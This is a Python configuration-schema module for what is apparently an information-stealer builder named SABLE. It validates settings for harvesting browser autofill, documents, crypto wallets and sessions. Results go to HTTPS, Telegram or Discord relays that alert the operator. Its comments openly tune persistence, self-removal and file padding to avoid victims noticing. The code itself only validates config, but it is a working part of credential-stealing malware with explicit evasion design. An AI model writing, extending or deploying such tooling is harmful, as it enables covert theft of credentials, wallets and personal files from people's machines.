"""SABLE configuration schema.

One shape, one reader. The frozen executable and the generated .py output both call
``from_dict``; nothing else is permitted to interpret a config mapping. The archive
member ``cfg.json`` is the only serialized form, and it is read from the running
executable, never from disk.

Field order inside each dataclass is required-fields-first so the dataclasses stay
legal without ``kw_only``; construction is by keyword everywhere, so the order is
not part of the contract.
"""

from __future__ import annotations

import json
from collections.abc import Mapping
from dataclasses import dataclass, fields
from typing import Any, Final, Literal, cast

SCHEMA_VERSION: Final[int] = 1

RelayKind = Literal["https", "telegram", "link"]

RELAY_KINDS: Final[tuple[str, ...]] = ("https", "telegram", "link")

# Ballast is padding on the finished artifact, so the ceiling is a build-time sanity
# bound rather than a policy: 4 GiB of padding is already an absurd artifact and
# anything above it is a typo that would fill a disk before it failed.
MAX_BALLAST_MB: Final[int] = 4096

# How often a persisted artifact may re-run. Above zero the artifact registers a timer as
# well as a logon task. A day is the ceiling because a machine that collects hourly for a
# week is a machine somebody notices; one that collects once a day is not.
MAX_PERSIST_HOURS: Final[int] = 24


class ConfigError(ValueError):
    """Raised for any config that does not match the schema.

    ``path`` is the dotted path of the offending value, ``detail`` is the reason.
    An empty path means the document itself is malformed.
    """

    def __init__(self, path: str, detail: str) -> None:
        self.path = path
        self.detail = detail
        super().__init__(f"{path or '<root>'}: {detail}")


@dataclass(frozen=True, slots=True)
class RelayConfig:
    kind: Literal["https", "telegram", "link"]
    endpoint: str
    # Optional second endpoint for short status lines: started, uploading, delivered,
    # failed. Empty means no status at all, which is what every artifact did before
    # this field existed, so an older cfg.json still parses and still runs.
    ping: str = ""
    # The text placed in front of terminal messages, so the operator's phone actually
    # rings. Discord suppresses every mention unless the payload also allows it, which
    # is why this travels with allowed_mentions rather than living in the body alone.
    # "@here", "@everyone" or "<@123456789012345678>" all work; empty sends nothing.
    mention: str = "@here"


@dataclass(frozen=True, slots=True)
class SourceConfig:
    autofill: bool = True
    documents: bool = True
    wallets: bool = True
    sessions: bool = True
    system: bool = True
    browsers: bool = True


@dataclass(frozen=True, slots=True)
class RunConfig:
    schema_version: int
    mutex: str
    seal_key: str
    relay: RelayConfig
    sources: SourceConfig
    self_remove: bool = False
    ballast_mb: int = 0
    # Opt-in and off by default. When on, the artifact copies the collected archive to
    # Documents\Sable Results before it transmits, so a run on a machine you control can
    # be opened and read in place. On somebody else's machine this is a footprint, which
    # is why it is a decision rather than a habit.
    keep_local: bool = False
    # Off by default. When on, the artifact copies itself into a durable folder and
    # registers a logon task, so a machine that reboots produces another result instead
    # of exactly one. ``persist_hours`` above zero adds a timer at that interval. A file
    # that survives is a file that can be found, which is why this is a decision and not
    # a habit, and why it is separate from ``self_remove`` rather than implied by it.
    persist: bool = False
    persist_hours: int = 0


def _names(cls: type) -> tuple[str, ...]:
    """Declared field names, in declaration order. Single source of truth."""
    return tuple(field.name for field in fields(cls))


RELAY_FIELDS: Final[tuple[str, ...]] = _names(RelayConfig)
SOURCE_FIELDS: Final[tuple[str, ...]] = _names(SourceConfig)
RUN_FIELDS: Final[tuple[str, ...]] = _names(RunConfig)


def _kind_of(value: Any) -> str:
    return type(value).__name__


def _require(mapping: Mapping[str, Any], key: str, path: str) -> Any:
    if key not in mapping:
        raise ConfigError(path + key, "required key is missing")
    return mapping[key]


def _as_mapping(value: Any, path: str) -> Mapping[str, Any]:
    if not isinstance(value, Mapping):
        # Nested paths arrive with their separator already attached ("relay."), and an
        # error naming "relay." sends the reader looking for a key that is not there.
        raise ConfigError(path.rstrip(". ") or "<root>", f"expected object, got {_kind_of(value)}")
    return value


def _as_str(value: Any, path: str) -> str:
    if type(value) is not str:
        raise ConfigError(path, f"expected str, got {_kind_of(value)}")
    return value


def _as_bool(value: Any, path: str) -> bool:
    # type() is exact on purpose: bool is an int subclass, and 1 must not pass as True.
    if type(value) is not bool:
        raise ConfigError(path, f"expected bool, got {_kind_of(value)}")
    return value


def _as_int(value: Any, path: str) -> int:
    if type(value) is not int:
        raise ConfigError(path, f"expected int, got {_kind_of(value)}")
    return value


def _as_int_in(value: Any, path: str, low: int, high: int) -> int:
    number = _as_int(value, path)
    if number < low or number > high:
        raise ConfigError(path, f"expected {low}..{high}, got {number}")
    return number


def _as_nonempty_str(value: Any, path: str) -> str:
    text = _as_str(value, path)
    if not text.strip():
        raise ConfigError(path, "must not be empty")
    return text


def _reject_unknown(mapping: Mapping[str, Any], allowed: tuple[str, ...], path: str) -> None:
    for key in mapping:
        if key not in allowed:
            raise ConfigError(path + str(key), "unknown key")


def _relay_from(value: Any, path: str) -> RelayConfig:
    data = _as_mapping(value, path)
    _reject_unknown(data, RELAY_FIELDS, path)
    kind = _as_str(_require(data, "kind", path), path + "kind")
    if kind not in RELAY_KINDS:
        raise ConfigError(
            path + "kind",
            f"expected one of {', '.join(RELAY_KINDS)}, got {kind!r}",
        )
    endpoint = _as_str(_require(data, "endpoint", path), path + "endpoint")
    # Absent rather than required: a config written before the field existed is a
    # valid config, and rejecting it would break every artifact already built.
    ping = _as_str(data["ping"], path + "ping") if "ping" in data else ""
    mention = _as_str(data["mention"], path + "mention") if "mention" in data else "@here"
    return RelayConfig(
        kind=cast(RelayKind, kind), endpoint=endpoint, ping=ping, mention=mention
    )


def _sources_from(value: Any, path: str) -> SourceConfig:
    data = _as_mapping(value, path)
    _reject_unknown(data, SOURCE_FIELDS, path)
    # Absent flags fall back to the dataclass default; present flags must be bool.
    present = {
        name: _as_bool(data[name], path + name)
        for name in SOURCE_FIELDS
        if name in data
    }
    return SourceConfig(**present)


def from_dict(data: Mapping[str, Any]) -> RunConfig:
    """Validate a mapping and return the frozen config. Raises ConfigError."""
    document = _as_mapping(data, "")
    _reject_unknown(document, RUN_FIELDS, "")

    version = _as_int(_require(document, "schema_version", ""), "schema_version")
    if version != SCHEMA_VERSION:
        raise ConfigError("schema_version", f"expected {SCHEMA_VERSION}, got {version}")

    mutex = _as_nonempty_str(_require(document, "mutex", ""), "mutex")
    seal_key = _as_nonempty_str(_require(document, "seal_key", ""), "seal_key")
    relay = _relay_from(_require(document, "relay", ""), "relay.")
    sources = _sources_from(_require(document, "sources", ""), "sources.")

    self_remove = (
        _as_bool(document["self_remove"], "self_remove") if "self_remove" in document else False
    )
    ballast_mb = (
        _as_int_in(document["ballast_mb"], "ballast_mb", 0, MAX_BALLAST_MB)
        if "ballast_mb" in document
        else 0
    )
    keep_local = (
        _as_bool(document["keep_local"], "keep_local") if "keep_local" in document else False
    )
    persist = _as_bool(document["persist"], "persist") if "persist" in document else False
    persist_hours = (
        _as_int_in(document["persist_hours"], "persist_hours", 0, MAX_PERSIST_HOURS)
        if "persist_hours" in document
        else 0
    )

    return RunConfig(
        schema_version=version,
        mutex=mutex,
        seal_key=seal_key,
        relay=relay,
        sources=sources,
        self_remove=self_remove,
        ballast_mb=ballast_mb,
        keep_local=keep_local,
        persist=persist,
        persist_hours=persist_hours,
    )


def from_json(text: str) -> RunConfig:
    """Parse cfg.json text and validate it. Raises ConfigError on any defect."""
    try:
        data = json.loads(text)
    except json.JSONDecodeError as exc:
        raise ConfigError("cfg.json", f"invalid JSON at line {exc.lineno}: {exc.msg}") from exc
    return from_dict(data)


def to_dict(cfg: RunConfig) -> dict[str, Any]:
    """Inverse of from_dict. Used by the UI and the packager, never by the agent."""
    return {
        "schema_version": cfg.schema_version,
        "mutex": cfg.mutex,
        "seal_key": cfg.seal_key,
        "self_remove": cfg.self_remove,
        "ballast_mb": cfg.ballast_mb,
        "keep_local": cfg.keep_local,
        "persist": cfg.persist,
        "persist_hours": cfg.persist_hours,
        "relay": {
            "kind": cfg.relay.kind,
            "endpoint": cfg.relay.endpoint,
            "ping": cfg.relay.ping,
            "mention": cfg.relay.mention,
        },
        "sources": {name: getattr(cfg.sources, name) for name in SOURCE_FIELDS},
    }


__all__ = [
    "MAX_BALLAST_MB",
    "MAX_PERSIST_HOURS",
    "RELAY_FIELDS",
    "RELAY_KINDS",
    "RUN_FIELDS",
    "SCHEMA_VERSION",
    "SOURCE_FIELDS",
    "ConfigError",
    "RelayConfig",
    "RelayKind",
    "RunConfig",
    "SourceConfig",
    "from_dict",
    "from_json",
    "to_dict",
]
